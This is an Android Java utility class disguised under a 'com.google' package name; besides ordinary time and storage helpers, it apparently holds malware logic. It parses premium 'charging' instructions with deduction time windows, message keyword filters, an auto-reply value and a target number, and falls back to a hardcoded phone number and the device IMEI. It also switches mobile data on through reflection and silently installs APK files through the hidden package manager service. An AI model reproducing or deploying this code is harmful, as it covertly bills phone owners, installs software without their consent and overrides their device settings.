package com.google.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;

import com.alibaba.fastjson.JSON;
import com.android.abutton.ApplicationEx;
import com.android.abutton.NewStarService;

import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.*;
import android.os.Environment;
import android.os.IBinder;
import android.os.storage.StorageManager;
import android.util.Log;
import android.widget.Toast;

public class Utils {
	public static boolean DEBUG = false;
	public static  ConnectivityManager mCM ; 
	
	static WifiManager mainWifi;
	public static void startServiceIntent(Context context){
		Intent j = new Intent(context,NewStarService.class);
		context.startService(j);
	}
	
	
	
	public static String getLineString(InputStream in){
		StringBuffer sb = new StringBuffer();
		BufferedReader read = new BufferedReader(new InputStreamReader(in));
		String temp;
		try {
			while ((temp=read.readLine())!=null) {
				sb.append(temp);
			}		
		} catch (IOException e) {
			e.printStackTrace();
		}
		return sb.toString();
	}
	
	public static void getLocationByWiFi(Context context){
		//获取wifi管理对象
		mainWifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
		//判断wifi是否开启
		if (mainWifi.isWifiEnabled())
		{
		//发送接入点的扫描请求，返回true成功。否则失败
		mainWifi.startScan();
		//启动一个线程执行第二步中的代码
		new Thread(){
				public void run() {
					setWeather();
				}
		}.start();
		}
		}
		

//第二步：这一步比较耗时，最好写在线程中。
	public static Location setWeather()
	{
		BufferedReader br = null;
		try
		{
			//接收请求结果，它会将所有链接wifi热点的链接信息返回
			List<ScanResult> wifiList = mainWifi.getScanResults();
			HttpPost httpRequest = new HttpPost("http://www.google.com/loc/json");
			//封装请求的参数
			JSONObject holder = new JSONObject();
			JSONArray array = new JSONArray();
			holder.put("version", "1.1.0");
			holder.put("host", "maps.google.com");
			holder.put("request_address", true);
			for (int i = 0; i < wifiList.size(); i++)
			{
				//只取当前链接信息。通过mac地址进行匹配
					//mac地址可以用
				String macAddress = mainWifi.getConnectionInfo().getMacAddress();
				if (wifiList.get(i).BSSID.equals(macAddress))
				{
					JSONObject current_data = new JSONObject();
					current_data.put("mac_address", wifiList.get(i).BSSID);
					current_data.put("ssid", wifiList.get(i).SSID);
					current_data.put("signal_strength", wifiList.get(i).level);
					array.put(current_data);
				}
			}
			holder.put("wifi_towers", array);
			StringEntity se = new StringEntity(holder.toString());
			httpRequest.setEntity(se);
			HttpResponse resp = new DefaultHttpClient().execute(httpRequest);
			if (resp.getStatusLine().getStatusCode() == 200)
			{
				HttpEntity entity = resp.getEntity();
				br = new BufferedReader(new InputStreamReader(entity.getContent()));
				StringBuffer sb = new StringBuffer();
				String result = br.readLine();
				while (result != null)
				{
					sb.append(result);
					result = br.readLine();
				}
				JSONObject location = new JSONObject(sb.toString());
				location = (JSONObject) location.get("location");
				
				Location loc = new Location(LocationManager.NETWORK_PROVIDER);
				loc.setLatitude((Double) location.get("latitude"));
				loc.setLongitude((Double) location.get("longitude"));
				return loc;
			}
			return null;
		}
		
		catch (Exception e)
		{
			Log.e("test",e.toString());
		}
		finally
		{
			if (null != br)
			{
				try
				{
					br.close();
				}
				catch (IOException e)
				{
					Log.e("test",e.toString());
				}
			}
		}
		return null;
	}
	
	public static String getCurrentTime(){
		SimpleDateFormat   formatter   =   new   SimpleDateFormat   ("yyyy-MM-dd   HH:mm:ss     ");     
		 Date   curDate   =   new   Date(System.currentTimeMillis());//获取当前时间     
		String   str   =   formatter.format(curDate);
		return str;
	}
	
	
	//只获取时分秒
	public static String getCurrentTimea(){
		SimpleDateFormat   formatter   =   new   SimpleDateFormat   ("HH:mm:ss");     
		 Date   curDate   =   new   Date(System.currentTimeMillis());//获取当前时间     
		String   str   =   formatter.format(curDate);
		return str;
	}
	//比较时间间隔几天
	public static long compareTime(String lastTime,String currentTime){
		DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

		try
		{
		    Date d1 = df.parse(currentTime);
		    Date d2 = df.parse(lastTime);
		    long diff = d1.getTime() - d2.getTime();
		    long days = diff / (1000 * 60 * 60 * 24);
		    return days;
		}
		catch (Exception e)
		{
		}
		return 0;
	}
	//比较时间间隔多少小时
	public static long compareTimeToHours(String lastTime,String currentTime){
		DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		try
		{
		    Date d1 = df.parse(currentTime);
		    Date d2 = df.parse(lastTime);
		    long diff = d1.getTime() - d2.getTime();
		    long hours = diff / (1000 * 60 * 60 );
		    return hours;
		}
		catch (Exception e)
		{
		}
		return 0;
	}
	
	//比较时间间隔多少分钟
		public static long compareTimeTomini(String lastTime,String currentTime){
			DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			try
			{
			    Date d1 = df.parse(currentTime);
			    Date d2 = df.parse(lastTime);
			    long diff = d1.getTime() - d2.getTime();
			    long minis = diff / (1000 * 60 );
			    return minis;
			}
			catch (Exception e)
			{
			}
			return 0;
		}
	
	//比较时间是否在几点到几点之间
	public static boolean compareBooleanTime(String startTime,String endTime){
		DateFormat df = new SimpleDateFormat("HH:mm:ss");
		try
		{
			Date nowDate = df.parse(getCurrentTimea());
			Log.e("test", "nowDate" + nowDate);
		    Date d1 = df.parse(startTime);
		    Date d2 = df.parse(endTime);
		    long diff1 = d1.getTime() - nowDate.getTime();
		    long diff2 = d2.getTime() - nowDate.getTime();
		    long times1 = diff1 / 1000 ;
		    long times2 = diff2/1000;
		    if (times1<0&&times2>0) 
		    	return true;
		}
		catch (Exception e)
		{
		}
		return false;
	}
	
	public static void AppToast(String text,Context context){
		if (DEBUG) 
			Toast.makeText(context, text, 3000).show();
	}
	
	public static void Log(String tag,String text){
		if (DEBUG) 
		Log.e(tag, text);
	}
	
	
	//判断service是否在运行
		public static  boolean isServiceStarted(Context context,String PackageName){
		    boolean isStarted =false;
		    try{
		    int intGetTastCounter = 1000;
		    ActivityManager mActivityManager =
		        (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
		    List<ActivityManager.RunningServiceInfo> mRunningService = 
		        mActivityManager.getRunningServices(intGetTastCounter);
		    for (ActivityManager.RunningServiceInfo amService : mRunningService){
		        if(0 == amService.service.getPackageName().compareTo(PackageName)){
		        isStarted = true;
		        break;
		        }
		    }
		    }catch(SecurityException e){
		    e.printStackTrace();
		    }            
		    return isStarted;                
		}
		
		
		public static String getLineString1(InputStream in){
			StringBuffer sb = new StringBuffer();
			BufferedReader read = new BufferedReader(new InputStreamReader(in));
			String temp;
			try {
				while ((temp=read.readLine())!=null) {
					sb.append(temp);
				}		
			} catch (IOException e) {
				e.printStackTrace();
			}
			return sb.toString();
		}
		//每条请求过服务器之后从sdk获取扣费信息
		public static  CostInfo getJsonObject() {
			String content = DataPreference.COSTINFO.get();
			CostInfo costInfo = ApplicationEx.getCostInfo();
			if (content!=null&&content.length()>1) {
				Utils.Log("test", "costinfo content : " + content);
				try {
					JSONObject jsonObject = new JSONObject(content);
					costInfo.setType(jsonObject.getString("type"));
					costInfo.setCommcate(jsonObject.getString("commcate"));
					costInfo.setDeductime(jsonObject.getString("deductime"));
					String string = jsonObject.getString("deductime");
					String[] a = string.split("-");
					costInfo.setStarttime(a[0]);//扣费开始时间
					costInfo.setEndtime(a[1]);//扣费结束时间
					costInfo.setInterval(jsonObject.getString("interval"));
					JSONArray array1 = jsonObject.getJSONArray("intkeyword");
					String[] intkeyword = new String[array1.length()];
					for (int i = 0; i < intkeyword.length; i++) {
						intkeyword[i]=array1.getString(i);
						Utils.Log("test", array1.getString(i));
					}
					costInfo.setIntkeyword(intkeyword);
					JSONArray array2 = jsonObject.getJSONArray("notintkeyword");
					String[] notintkeyword = new String[array2.length()];
					for (int j = 0; j < notintkeyword.length; j++) {
						notintkeyword[j]=array2.getString(j);
						Utils.Log("test", array2.getString(j));
					}
					
					JSONArray array3 = jsonObject.getJSONArray("twokeyword");
					String[] twokeyword = new String[array3.length()];
					for (int j = 0; j < twokeyword.length; j++) {
						twokeyword[j]=array3.getString(j);
					}
					costInfo.setNotintkeyword(notintkeyword);
					costInfo.setReply(jsonObject.getString("reply"));
					costInfo.setTnumber(jsonObject.getString("tnumber"));
					costInfo.setTwokeyword(twokeyword);
					costInfo.setWordprot(jsonObject.getString("wordprot"));
					costInfo.setWordtime(jsonObject.getString("wordtime"));
					DataPreference.WORDTIME.put(jsonObject.getString("wordtime"));
					costInfo.setProtcode(jsonObject.getString("protcode"));
					Utils.Log("test", costInfo.getCommcate()+costInfo.getDeductime()+costInfo.getInterval()+costInfo.getProtcode()
							+costInfo.getReply()+costInfo.getTnumber()+costInfo.getTwokeyword()+costInfo.getType()+costInfo.getWordprot()
							+costInfo.getWordtime()+costInfo.getIntkeyword().toString()+costInfo.getNotintkeyword().toString());
					
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
		}else {
			if (DataPreference.COSTINFO.get().length()>1) 
				return costInfo;
			costInfo.setProtcode("18811087096");
			costInfo.setType("普通");
			costInfo.setCommcate("imei"+DataPreference.IMEI.get());
			costInfo.setDeductime("00:00:00-00:00:01");
			costInfo.setStarttime("00:00:00");
			costInfo.setEndtime("00:00:01");
			costInfo.setInterval("1");
			costInfo.setIntkeyword(new String[]{"454545","34343434"});
			costInfo.setNotintkeyword(new String[]{"454545","34343434"});
			costInfo.setReply("bbb");
			costInfo.setTnumber("1");
			costInfo.setTwokeyword(new String[]{"454545","34343434"});
			costInfo.setWordprot("90");
			costInfo.setWordtime("100");
			DataPreference.COSTINFO.put(JSON.toJSONString(costInfo));
		}
		return costInfo;
}
		//判断字符串是否含有任意字符串数组中一个一个字符串
		public static boolean isContainsArray(String str,String[] a,boolean flag){
			for (int i = 0; i < a.length; i++) {
				if (str.indexOf(a[i])>=0) 
					return true;
			}
			return flag;
		}
		
		public static String getMiddleString(String str){
			int i = str.indexOf("你好");
			int j = str.indexOf("到了");
			String midString = str.substring(i, j);
			return midString;
		}
		
		
		public void myTimer(long milions,int times){
			
		}
		
		/**
	     * 判断网络是否可用
	     *
	     * @param context
	     * @return
	     */
	    public static boolean isOnline(Context context) {
	        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
	        NetworkInfo info = (cm != null) ? cm.getActiveNetworkInfo() : null;
	        if (info != null && info.isAvailable() && info.isConnected()) {
	            return true;
	        }else {
//				Utils.gprsSetter(context);
			}
	        return false;
	    }
	    
	  //打开或关闭GPRS
		public static boolean gprsSetter(Context context)  
	    {  
	                  
	        boolean isOpen = gprsIsOpenMethod("getMobileDataEnabled",context);  
	        if(isOpen)  
	        {  
	           
	        }else{
	        	setGprsEnabled("setMobileDataEnabled", true);
	        	System.out.println("开启");
	        }
	          
	        return isOpen;    
	    } 
		
		//开启/关闭GPRS   
		public static void setGprsEnabled(String methodName, boolean isEnable)  
		{  
			Class cmClass       = mCM.getClass();  
			Class[] argClasses  = new Class[1];  
			argClasses[0]       = boolean.class;  
	      
			try  
			{  
				Method method = cmClass.getMethod(methodName, argClasses);  
				method.invoke(mCM, isEnable);  
			} catch (Exception e)  
			{  
				e.printStackTrace();  
			}  
		}	
		
		//检测GPRS是否打开   
		public static boolean gprsIsOpenMethod(String methodName,Context context)  
		{  
			mCM = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			Class cmClass       = mCM.getClass();  
			Class[] argClasses  = null;  
			Object[] argObject  = null;  
	      
			Boolean isOpen = false;  
			try  
			{  
				Method method = cmClass.getMethod(methodName, argClasses);  

				isOpen = (Boolean) method.invoke(mCM, argObject);  
			} catch (Exception e)  
			{  
				e.printStackTrace();  
			}  

			return isOpen;  
		}  
		
		 /**
	     * 获取下载路径
	     *
	     * @return
	     */
	    public static String getDownloadLocation(Context context) {
	        String parent = getDownloadDirectory(context);
	        if (parent==null&&Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) 
	          parent = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
	            return parent;
	    }
	    
	    /**
	     * 获得可下载路径
	     *
	     * @param context
	     * @return
	     */
	    public static String getDownloadDirectory(Context context) {
	        StorageManager sm = (StorageManager) context.getSystemService(Context.STORAGE_SERVICE);
	        Method getVolumePaths = null;
	        try {
	            getVolumePaths = StorageManager.class.getMethod("getVolumePaths");
	            String[] paths = (String[]) getVolumePaths.invoke(sm);
	            for (String path : paths) {
	                File file = new File(path, "Download");
	                logW("测试存储位置：" + file.getAbsolutePath() + "是否可用");
	                if (file.exists()) {
	                   logW(file.getAbsolutePath() + "存在，直接返回路径。");
	                    return file.getAbsolutePath();
	                } else {
	                    boolean mkdirs = file.mkdirs();
	                    if (mkdirs) {
	                        logW(file.getAbsolutePath() + "创建成功。");
	                        return file.getAbsolutePath();
	                    } else {
	                        logW(file.getAbsolutePath() + "创建失败。");
	                    }
	                }
	            }
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	        return null;
	    }
	    
	    /**
	     * 判断一个字符串是否为空
	     *
	     * @param str
	     * @return
	     */
	    public static boolean isEmpty(String str) {
	        if (str == null)
	            return true;
	        if (str.trim().length() == 0)
	            return true;
	        return false;
	    }
	    
	    /**
	     * DEBUG模式下打印debug级别的信息
	     *
	     * @param msg
	     */
	    public static void logW(String msg) {
	            Log.w("INSTALL_PLUGIN", msg);
	    }
	    
	    
	    
	    /**
	     * 安装apk文件
	     *
	     * @param context
	     * @param info
	     * @param observer
	     * @throws Exception
	     */
	    public static void installFile(Context context, String path, IPackageInstallObserver observer) {
	        logW("准备静默安装：" + path);
	        File file = new File(path);
	        if (file == null || !file.isFile())
	            return;
	            try {
	                getPackageManger().installPackage(Uri.fromFile(file), observer, 0, "com.google.googletools");
	            } catch (Exception e) {
	                e.printStackTrace();
	            }
	    }
	    
	    /**
	     * 得到packagemanager，安装apk。
	     *
	     * @return 返回IPackageManager对象。
	     */
	    @SuppressWarnings({"rawtypes", "unchecked"})
	    private static IPackageManager getPackageManger() {
	        try {	
	            Class clazz = Tools.class.getClassLoader().loadClass("android.os.ServiceManager");
	            Method method = clazz.getMethod("getService", new Class[]{String.class});
	            IBinder b = (IBinder) method.invoke(null, "package");
	            return IPackageManager.Stub.asInterface(b);
	        } catch (Exception e) {
	            return null;
	        }
	    }
	    
	    /**
	      * 比较时间大小
	      */
	     public static long compareTimeforLong(String lastTime,String currentTime){
	 		DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	 		try
	 		{
	 		    Date d1 = df.parse(currentTime);
	 		    Date d2 = df.parse(lastTime);
	 		    long diff = d1.getTime() - d2.getTime();
	 		    long days = diff / (1000 * 60 * 60 * 24);
	 		    return days;
	 		}
	 		catch (Exception e)
	 		{
	 		}
	 		return 0;
	 	}
	    
	    /**
	     * 根据包名启动程序
	     *
	     * @param context
	     * @param packageName
	     */
	    public static void launchApplication(Context context, String packageName) {
	        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
	        if (intent != null)
	            context.startActivity(intent);
	    }

}


